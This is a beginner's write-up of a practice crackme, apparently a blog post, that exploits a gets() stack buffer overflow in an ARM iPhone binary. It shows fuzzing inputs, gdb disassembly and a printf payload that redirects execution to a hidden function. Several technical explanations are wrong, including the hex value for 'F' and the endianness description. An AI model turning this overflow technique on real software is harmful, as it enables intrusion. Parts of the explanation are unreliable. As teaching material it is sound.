To start things off, I want to make a preface. My writing skills are not perfect. I am attempting to hone my ability to explain programming to absolute beginners.
By no means am I the best programmer in the world; this write up is the best thing I can do to improve my skills in the field of Computer Science.

Now, to the fun stuff. I ran across this simple crack me but it had a twist; it was for iPhone exploitation. I cannot tell you how much I loved my jailbroken iPhone.
It made me want to hack the secured, wall-garden that is the Apple eco-system. This was an opportunity was my first _crack_ at iPhone jailbreaking.

The flaw in this program is a simple stack overflow buffer. All we need to do is provide an input large enough to overwrite the pre-existing memory address for other functions.
What do I mean by this? When a program is compiled, each part to the tech puzzle has a memory address. This is just a space in memory needed by the computer. For example, let's say that
you live on Elm Street, which for this example will represent the entire memory needed to run the program. Each house (in this case a part of the tech puzzle) is on a memory _address_ , a set place and not moving (in this program, I'll get to ASLR in a different tutorial)

Now that we know what we need to do, let's start feeding the program some input.

```
iPhone:/ root# echo "AAAABBBBCCCCDDDD" | ./roplevel1
Welcome to ROPLevel1 for ARM! Created by Billy Ellis (@bellis1000)
warning: this program uses gets(), which is unsafe.
Everything seems normal.
```

Great, the program did not crash, we know that this input is not big enough. Let's go bigger.

```
iPhone:/ root# echo "AAAABBBBCCCCDDDDEEEEEFFFFGGGG" | ./roplevel1
Welcome to ROPLevel1 for ARM! Created by Billy Ellis (@bellis1000)
warning: this program uses gets(), which is unsafe.
Everything seems normal.
Segmentation fault: 11
```

Uh-oh, the program did crash. We can tell because of the Segmentation fault tag. That means the program did not have enough memory allocated to run that big of an input.
We can then deduce that there is a function that does not check the input size. First thing that comes to mind is the gets() and strcpy() functions. Both of these do not check the size of a given input, allowing us to write as much data as we'd like.
This is very helpful because we can include a memory address to which the program can execute the unintended function in the program.


What do I mean by this? First, let's investigate the crash log. Thankfully, Apple has a great crash log service called CrashReporter, which does what the name suggests. Most of the contents are irrelevant to us at the moment. However, this line tells us all we need to know:
```
Exception Subtype: KERN_INVALID_ADDRESS at 0x46464644
```

This looks confusing but let's take it piece by piece
Each of the numbers/letters in the memory address are hex values are for ASCII characters. The block of "64" are the character "F", so we know that this is where the return address is supposed to be.
Let's find out where the starting memory address is for the function "secret"

```
(gdb) disassemble secret
Dump of assembler code for function secret:
0x0000be70 <secret+0>:  80 40 2d e9                   push	{r7, lr}
0x0000be74 <secret+4>:  0d 70 a0 e1                   mov	r7, sp
0x0000be78 <secret+8>:  08 d0 4d e2                   sub	sp, sp, #8	; 0x8
0x0000be7c <secret+12>:  78 0f 0b e3                   movw	r0, #49016	; 0xbf78
0x0000be80 <secret+16>:  00 00 40 e3                   movt	r0, #0	; 0x0
0x0000be84 <secret+20>:  5b 00 00 eb                   bl	0xbff8
0x0000be88 <secret+24>:  30 10 0c e3                   movw	r1, #49200	; 0xc030
0x0000be8c <secret+28>:  00 10 40 e3                   movt	r1, #0	; 0x0
0x0000be90 <secret+32>:  04 00 8d e5                   str	r0, [sp, #4]
0x0000be94 <secret+36>:  01 00 a0 e1                   mov	r0, r1
0x0000be98 <secret+40>:  57 00 00 eb                   bl	0xbffc
0x0000be9c <secret+44>:  00 10 00 e3                   movw	r1, #0	; 0x0
0x0000bea0 <secret+48>:  00 00 8d e5                   str	r0, [sp]
0x0000bea4 <secret+52>:  01 00 a0 e1                   mov	r0, r1
0x0000bea8 <secret+56>:  50 00 00 eb                   bl	0xbff0
End of assembler dump.
(gdb)
```

It appears to be 0x0000be70. There's only one problem, this memory address is in the format called big endian. Modern CPUs accept memory addresses that are in the format of little endian.
How do we fix this? We need to convert it to little endian by putting the least significant bit, "70" in first. Then it would be "be" and so on. There also needs to be forward slashes in front of every instance of a bit. Luckily, I made a program that does this for us.

The link to the tool can be found [here](https://github.com/DisJJ/Jailbreak-Dump-Tool/blob/master/bash%20scripts/mem2end)

This is how we would go about using the program

```bash
~/Desktop $ mem2end 0x0000be70
\x70\xbe\x00\x00
~/Desktop $
```
We would the copy the output and put it next to the "E's" in the input that crashed the program and we would remove the "E's" and "G's". We're going to use printf, which is an alternative to the echo command but it will allow us to input hex values. Like so:

```
iPhone:/ root# printf "AAAABBBBCCCCDDDDEEEE\x70\xbe\x00\x00" | ./roplevel1
Welcome to ROPLevel1 for ARM! Created by Billy Ellis (@bellis1000)
warning: this program uses gets(), which is unsafe.
Everything seems normal.
executing string...
Sat Jul 22 20:01:14 PDT 2017
``
Yay! The secret function turned out to be just a date command. The bigger picture is that stack buffer overflows allow attackers to jump into different functions to jump into other functions and so on.
This is called ROP (Return oriented programming) chaining. This is the basics of how a jailbreak works in the simplest of terms.

Thanks for reading and happy hacking :).
